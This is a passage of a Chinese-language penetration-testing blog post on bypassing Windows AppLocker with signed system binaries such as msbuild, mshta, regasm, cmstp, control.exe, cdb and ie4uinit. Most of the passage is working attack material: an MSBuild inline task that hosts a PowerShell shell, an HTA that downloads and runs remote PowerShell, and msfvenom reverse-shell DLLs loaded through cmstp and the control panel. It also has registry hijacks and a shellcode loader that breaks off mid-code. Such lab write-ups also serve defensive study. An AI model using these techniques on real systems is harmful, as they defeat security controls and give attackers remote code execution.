task executes c# code. --&gt;</span><br><span class="line">  &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml --&gt;</span><br><span class="line">   &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;</span><br><span class="line">  &lt;!-- License: BSD 3-Clause --&gt;</span><br><span class="line">  &lt;Target Name=&quot;Hello&quot;&gt;</span><br><span class="line">   &lt;FragmentExample /&gt;</span><br><span class="line">   &lt;ClassExample /&gt;</span><br><span class="line">  &lt;/Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName=&quot;FragmentExample&quot;</span><br><span class="line">    TaskFactory=&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">    &lt;ParameterGroup/&gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">      &lt;Using Namespace=&quot;System&quot; /&gt;</span><br><span class="line">	  &lt;Using Namespace=&quot;System.IO&quot; /&gt;</span><br><span class="line">      &lt;Code Type=&quot;Fragment&quot; Language=&quot;cs&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">			    Console.WriteLine(&quot;Hello From Fragment&quot;);</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">	&lt;/UsingTask&gt;</span><br><span class="line">	&lt;UsingTask</span><br><span class="line">    TaskName=&quot;ClassExample&quot;</span><br><span class="line">    TaskFactory=&quot;CodeTaskFactory&quot;</span><br><span class="line">    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;</span><br><span class="line">	&lt;Task&gt;</span><br><span class="line">	  &lt;Reference Include=&quot;System.Management.Automation&quot; /&gt;</span><br><span class="line">      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;</span><br><span class="line">        &lt;![CDATA[</span><br><span class="line">		</span><br><span class="line">			using System;</span><br><span class="line">			using System.IO;</span><br><span class="line">			using System.Diagnostics;</span><br><span class="line">			using System.Reflection;</span><br><span class="line">			using System.Runtime.InteropServices;</span><br><span class="line">			//Add For PowerShell Invocation</span><br><span class="line">			using System.Collections.ObjectModel;</span><br><span class="line">			using System.Management.Automation;</span><br><span class="line">			using System.Management.Automation.Runspaces;</span><br><span class="line">			using System.Text;</span><br><span class="line">			using Microsoft.Build.Framework;</span><br><span class="line">			using Microsoft.Build.Utilities;</span><br><span class="line">							</span><br><span class="line">			public class ClassExample :  Task, ITask</span><br><span class="line">			&#123;</span><br><span class="line">				public override bool Execute()</span><br><span class="line">				&#123;</span><br><span class="line">					</span><br><span class="line">					while(true)</span><br><span class="line">					&#123;</span><br><span class="line">						</span><br><span class="line">						Console.Write(&quot;PS &gt;&quot;);</span><br><span class="line">						string x = Console.ReadLine();</span><br><span class="line">						try</span><br><span class="line">						&#123;</span><br><span class="line">							Console.WriteLine(RunPSCommand(x));</span><br><span class="line">						&#125;</span><br><span class="line">						catch (Exception e)</span><br><span class="line">						&#123;</span><br><span class="line">							Console.WriteLine(e.Message);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					</span><br><span class="line">								return true;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				//Based on Jared Atkinson&apos;s And Justin Warner&apos;s Work</span><br><span class="line">				public static string RunPSCommand(string cmd)</span><br><span class="line">				&#123;</span><br><span class="line">					//Init stuff</span><br><span class="line">					Runspace runspace = RunspaceFactory.CreateRunspace();</span><br><span class="line">					runspace.Open();</span><br><span class="line">					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);</span><br><span class="line">					Pipeline pipeline = runspace.CreatePipeline();</span><br><span class="line">					//Add commands</span><br><span class="line">					pipeline.Commands.AddScript(cmd);</span><br><span class="line">					//Prep PS for string output and invoke</span><br><span class="line">					pipeline.Commands.Add(&quot;Out-String&quot;);</span><br><span class="line">					Collection&lt;PSObject&gt; results = pipeline.Invoke();</span><br><span class="line">					runspace.Close();</span><br><span class="line">					//Convert records to strings</span><br><span class="line">					StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">					foreach (PSObject obj in results)</span><br><span class="line">					&#123;</span><br><span class="line">						stringBuilder.Append(obj);</span><br><span class="line">					&#125;</span><br><span class="line">					return stringBuilder.ToString().Trim();</span><br><span class="line">				 &#125;</span><br><span class="line">				 </span><br><span class="line">				 public static void RunPSFile(string script)</span><br><span class="line">				&#123;</span><br><span class="line">					PowerShell ps = PowerShell.Create();</span><br><span class="line">					ps.AddScript(script).Invoke();</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line"> </span><br><span class="line">			</span><br><span class="line">        ]]&gt;</span><br><span class="line">      &lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">  &lt;/UsingTask&gt;</span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure>
+<p>原地址：<a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml" target="_blank" rel="noopener">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbg3ijniatj30m306y747.jpg" alt="17.png"></p>
+<p>成功绕过对powershell的限制。</p>
+<p>常见路径如下：</p>
+<ul>
+<li>C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe</li>
+</ul>
+<h3 id="Mshta-exe"><a href="#Mshta-exe" class="headerlink" title="Mshta.exe"></a>Mshta.exe</h3><p>mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。默认已集成在环境变量中。</p>
+<p>使用Mshta的方式有很多，我们这里使用msf的exploit/windows/misc/hta_server模块进行测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/misc/hta_server</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109</span><br><span class="line">msf exploit(windows/misc/hta_server) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbh59gyghwj30my07cwfx.jpg" alt="0.png"></p>
+<p>目标机执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http://192.168.0.106:8080/JR1gb3TO6.hta</span><br></pre></td></tr></table></figure>
+<p>即可上线。</p>
+<p>除了这种方法hta还可以使用cobaltstrike<br>、Setoolkit、Magic unicorn、Empire、CactusTorch、Koadic、Great SCT等进行上线。</p>
+<p>除了本地文件，mshta还支持远程下载的方式执行payload，比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe javascript:a=GetObject(&quot;script:https://gist.github.com/someone/something.sct&quot;).Exec();close();</span><br></pre></td></tr></table></figure>
+<p>除了以上的方式，mshta可以用用来执行powershell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">    Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">    objShell.Run &quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://ip:port/&apos;)&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;BODY&gt; </span><br><span class="line">&lt;/BODY&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+<p>即使applocker已经禁止powershell执行了</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbh5fv438bj30z009yjsa.jpg" alt="1.png"></p>
+<h3 id="Presentationhost-exe"><a href="#Presentationhost-exe" class="headerlink" title="Presentationhost.exe"></a>Presentationhost.exe</h3><p>Presentationhost.exe是一个内置的Windows可执行文件，用于运行XAML浏览器应用程序（即.xbap文件）</p>
+<p>具体原理这里就不再赘述了，我们直接将网上公布的poc拿过来，下载地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jpginc/xbapAppWhitelistBypassPOC/tree/master/powershell/bin/Debug</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbh6e3p2l7j30ww0c7q3v.jpg" alt="2.png"></p>
+<p>可以看到Presentationhost.exe是可以运行的，但是给出的poc却执行失败了，不知道是不是我版本的问题，根据网上各个大佬复现的情况来看，这个方法的确不是很好，即使成功，也会在调用其他文件时被applocker给拦截掉。</p>
+<p>常见路径如下：</p>
+<ul>
+<li>c:\windows\system32\PresentationHost.exe</li>
+<li>c:\windows\sysWOW64\PresentationHost.exe</li>
+</ul>
+<h3 id="Regasm-exe、Regsvcs-exe"><a href="#Regasm-exe、Regsvcs-exe" class="headerlink" title="Regasm.exe、Regsvcs.exe"></a>Regasm.exe、Regsvcs.exe</h3><p>Regsvcs和Regasm是Windows命令行实用程序，用于注册.NET组件对象模型（COM）程序集。两者都是由Microsoft进行数字签名的。</p>
+<p>我们使用ＧreatSct的 regasm/meterpreter/模块生产我们所需要的文件。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbh7qq1fokj30ml0cxdj2.jpg" alt="4.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbh7mcm29nj30h003474s.jpg" alt="3.png"></p>
+<p>然后手动编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library payload.cs</span><br></pre></td></tr></table></figure>
+<p>然后执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U C:\payload1.dll</span><br></pre></td></tr></table></figure>
+<p>msf即可收到回话。</p>
+<p>Regsvcs的执行方式也一样。两者都会发起反弹连接，触发事件ID 3</p>
+<p>文件路径如下：</p>
+<ul>
+<li>C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe</li>
+</ul>
+<h3 id="Bginfo"><a href="#Bginfo" class="headerlink" title="Bginfo"></a>Bginfo</h3><p>Bginfo是一款强大的Windows系统信息显示工具.而且可以执行vbs，此时我们便可以使用它绕过一些限制。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">strProgram = &quot;powershell.exe&quot;</span><br><span class="line">strPath    = &quot;C:\Windows\System32\WindowsPowerShell\v1.0&quot; </span><br><span class="line">Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">strCommand = fso.BuildPath(strPath, strProgram) </span><br><span class="line">Set app = CreateObject(&quot;Shell.Application&quot;)</span><br><span class="line">app.ShellExecute strCommand, , strPath, , 1  </span><br><span class="line">echo &quot;pentestlab&quot;</span><br></pre></td></tr></table></figure>
+<p>新建项哪里选择vbs：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbh8bptnmyj30tu0he44d.jpg" alt="5.png"></p>
+<p>悲惨的是绕过失败了</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbh8crr1wej30qc07r41i.jpg" alt="6.png"></p>
+<p>除了这种之外，我们也可以用<a href="https://github.com/3gstudent/bgi-creater来生成一个BgInfo的bgi配置文件。" target="_blank" rel="noopener">https://github.com/3gstudent/bgi-creater来生成一个BgInfo的bgi配置文件。</a></p>
+<p>然后这样加载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bginfo.exe test1.bgi /timer:0 /nolicprompt /silent</span><br></pre></td></tr></table></figure>
+<p>成功绕过applocker…</p>
+<p>当然除了这样你也可以用它来加载一个msf的shell，就看个人发挥了。</p>
+<h3 id="Cdb-exe"><a href="#Cdb-exe" class="headerlink" title="Cdb.exe"></a>Cdb.exe</h3><p>cdb是一个windows下的调试器，具体的参数可以查看：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options</a></p>
+<p>一般如果安装后存在的路径如下：</p>
+<ul>
+<li>C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe</li>
+<li>C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe</li>
+</ul>
+<p>我们可以使用下面的命令执行我们的shellcode：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdb.exe -cf x64_calc.wds -o notepad.exe</span><br></pre></td></tr></table></figure>
+<p>即在主机的notepad.exe进程中执行shellcode</p>
+<p>payload地址如下：</p>
+<p><a href="https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda" target="_blank" rel="noopener">https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda</a></p>
+<h3 id="Cmstp-exe"><a href="#Cmstp-exe" class="headerlink" title="Cmstp.exe"></a>Cmstp.exe</h3><p>CMSTP是一个与Microsoft连接管理器配置文件安装程序关联的二进制文件。可以执行inf和dll的文件，且拥有微软签名。该文件不仅可以绕过applocker还可以用来绕过uac。</p>
+<p>文件位置为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\cmstp.exe</span><br><span class="line">C:\Windows\SysWOW64\cmstp.exe</span><br></pre></td></tr></table></figure>
+<p>我们先使用msf生成一个dll文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -f dll &gt; pentest.dll</span><br></pre></td></tr></table></figure>
+<p>然后创建一个inf文件，里面包含我们的dll的本地位置或者网络位置，大体写法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[version]</span><br><span class="line">Signature=$chicago$</span><br><span class="line">AdvancedINF=2.5</span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">RegisterOCXs=RegisterOCXSection</span><br><span class="line">[RegisterOCXSection]</span><br><span class="line">C:\Users\pentestlab.dll</span><br><span class="line">[Strings]</span><br><span class="line">AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName=&quot;Pentestlab&quot;</span><br><span class="line">ShortSvcName=&quot;Pentestlab&quot;</span><br></pre></td></tr></table></figure>
+<p>然后执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;C:\Windows\System32\cmstp.exe /s c:\Windows\Syste</span><br><span class="line">m32\2.inf</span><br></pre></td></tr></table></figure>
+<p>msf即可收到会话。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbg191grx1j30n406zt9u.jpg" alt="11.png"></p>
+<h3 id="Control-exe"><a href="#Control-exe" class="headerlink" title="Control.exe"></a>Control.exe</h3><p>Control.exe是windows下的控制面板工具，我们同样可以使用他来绕过一些applocker。</p>
+<p>它可以调用cpl文件，我们可以使用修改注册表的方法来实现启动控制面板即调用我们恶意程序的目的（默认用户可以修改），具体命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls&quot;</span><br><span class="line">/v pentestlab.cpl /t REG_SZ /d &quot;C:\pentestlab.cpl&quot;</span><br></pre></td></tr></table></figure>
+<p>关于cpl的制作我们可以实现生成一个dll文件，然后使用type的ads流来生成。</p>
+<p>除了上面的命令还可以使用下面的脚本实现一样的效果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">const HKEY_CURRENT_USER = &amp;amp;H80000001</span><br><span class="line"> </span><br><span class="line">strComputer = &quot;.&quot;</span><br><span class="line"> </span><br><span class="line">Set objReg=GetObject(</span><br><span class="line">&quot;winmgmts:&#123;impersonationLevel=impersonate&#125;!\\&quot; &amp; strComputer &amp; &quot;\root\default:StdRegProv&quot;)</span><br><span class="line"> </span><br><span class="line">strKeyPath = &quot;Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs&quot;</span><br><span class="line">objReg.CreateKey HKEY_CURRENT_USER,strKeyPath</span><br><span class="line"> </span><br><span class="line">strValueName = &quot;pentestlabCPL&quot;</span><br><span class="line">strValue = &quot;C:\pentestlabCPL.cpl&quot;</span><br><span class="line">objReg.SetStringValue</span><br><span class="line">HKEY_CURRENT_USER,strKeyPath,strValueName,strValue</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var obj = WScript.CreateObject(&quot;WScript.Shell&quot;);</span><br><span class="line">obj.RegWrite(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLs&quot;, &quot;Top level key&quot;);</span><br><span class="line">obj.RegWrite(&quot;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\CPLs\\pentestlabCPL&quot;, &quot;C:\\pentestlabCPL.cpl&quot;,&quot;REG_SZ&quot;);</span><br></pre></td></tr></table></figure>
+<p>假如我们的dll文件是使用以下命令生成的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec cmd=&quot;cmd.exe&quot; -f dll -o emd.dll</span><br></pre></td></tr></table></figure>
+<p>那么在我们调用控制面板时，就会弹出cmd窗口。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbjh6l46j4j30up0caglw.jpg" alt="5.png"></p>
+<h3 id="Csi-exe、Dnx-exe"><a href="#Csi-exe、Dnx-exe" class="headerlink" title="Csi.exe、Dnx.exe"></a>Csi.exe、Dnx.exe</h3><p>这两个程序差不多，都是可以运行c#代码，我们可以利用这两个程序来绕过一些限制。<br>唯一不同的是dnx需要一个json文件，json的创建可以参考<br><a href="https://docs.microsoft.com/zh-cn/archive/blogs/sujitdmello/step-by-step-installation-instructions-for-getting-dnx-on-your-windows-machine" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/archive/blogs/sujitdmello/step-by-step-installation-instructions-for-getting-dnx-on-your-windows-machine</a></p>
+<p>大体如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">&quot;commands&quot;: &#123;</span><br><span class="line">&quot;ConsoleApp&quot;: &quot;ConsoleApp&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;frameworks&quot;: &#123;</span><br><span class="line">&quot;dnx451&quot;: &#123; &#125;,</span><br><span class="line">&quot;dnxcore50&quot;: &#123;</span><br><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">&quot;System.Console&quot;: &quot;4.0.0-beta-*&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们就可以用csi.exe或者dnx.exe来运行我们的代码，且新进程是使用csi、dnx来运行的。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbji3pwlvtj30c101fwef.jpg" alt="6.png"></p>
+<h3 id="fsi-exe"><a href="#fsi-exe" class="headerlink" title="fsi.exe"></a>fsi.exe</h3><p>fsi.exe是一个用来执行f#的工具，我们同样可以使用它来绕过applocker。</p>
+<p>f#的后缀为.fsscript，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#r @&quot;C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll&quot;</span><br><span class="line"></span><br><span class="line">open System.Management.Automation</span><br><span class="line">open System.Management.Automation.Runspaces</span><br><span class="line">open System</span><br><span class="line"></span><br><span class="line">let runSpace = RunspaceFactory.CreateRunspace()</span><br><span class="line">runSpace.Open()</span><br><span class="line">let pipeline = runSpace.CreatePipeline()</span><br><span class="line"></span><br><span class="line">let getProcess = new Command(&quot;Get-Process&quot;)</span><br><span class="line">pipeline.Commands.Add(getProcess)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let output = pipeline.Invoke()</span><br><span class="line">for psObject in output do</span><br><span class="line">psObject.Properties.Item(&quot;ProcessName&quot;).Value.ToString()</span><br><span class="line">|&gt; printfn &quot;%s&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjiidiqzcj30o00e3aj8.jpg" alt="8.png"></p>
+<h3 id="Ie4unit-exe"><a href="#Ie4unit-exe" class="headerlink" title="Ie4unit.exe"></a>Ie4unit.exe</h3><p>IE4Uinit一般与Active Setup结合使用，并在登录过程中首次创建用户配置文件时（或在每次配置强制配置文件时）运行。详细介绍为：</p>
+<p><a href="https://docs.microsoft.com/zh-cn/archive/blogs/askie/things-to-do-when-troubleshooting-internet-explorer-terminal-server-and-profiles-issues" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/archive/blogs/askie/things-to-do-when-troubleshooting-internet-explorer-terminal-server-and-profiles-issues</a></p>
+<p>以及部分用法：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjj1ainjej30p90gb77l.jpg" alt="9.png"></p>
+<p>且会调用system32或SysWOW64下面的ieuinit.inf。我们进行一些测试，来用它绕过对calc的限制。</p>
+<p>先把他们放到同一目录，因为在system中我们可能不能编辑对应的文件，但是我们可以将它复制出来进行编辑或者替换，而且Ie4unit.exe可以默认调用自己目录下的inf</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjj4fdufzj30j006tt8k.jpg" alt="10.png"></p>
+<p>我们找到MSIE4RegisterOCX.Windows7，这个是我们可以放置我们scrobj.dll和SCT URL的地方。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjj98pbqpj30vb09nq38.jpg" alt="11.png"></p>
+<p>执行ie4uinit.exe -BaseSettings，绕过applocker对calc的限制，弹出计算机。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjjbqcfudj30ol06c74d.jpg" alt="12.png"></p>
+<p>不过这个对版本有点限制，不同计算机不一定都能成功，具体原因不知道。</p>
+<h3 id="Ieexec-exe"><a href="#Ieexec-exe" class="headerlink" title="Ieexec.exe"></a>Ieexec.exe</h3><p>IEExec.exe应用程序是.NET Framework附带Microsoft .NET Framework应用程序。可以用IEExec.exe运行使用URL启动的其他托管应用程序。</p>
+<p>我们先使用msf生成我们的shellcode</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbjjzz6wmmj30l80dvwj3.jpg" alt="13.png"></p>
+<p>然后使用下面的加载器编译我们的shellcode：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">using System; </span><br><span class="line">using System.Runtime.InteropServices; </span><br><span class="line">namespace native </span><br><span class="line">&#123; </span><br><span class="line">    class Program </span><br><span class="line">    &#123; </span><br><span class="line">            private static UInt32 MEM_COMMIT = 0x1000; </span><br><span class="line">            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; </span><br><span class="line">            private static UInt32 MEM_RELEASE = 0x8000; </span><br><span class="line"></span><br><span class="line">        public static void Main(string[] args) </span><br><span class="line">        &#123; </span><br><span class="line">            // native function&apos;s compiled code </span><br><span class="line"></span><br><span class="line">            shllcode</span><br><span class="line">            &#125;; </span><br><span class="line"></span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); </span><br><span class="line">            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length); </span><br><span class="line">            IntPtr hThread = IntPtr.Zero; 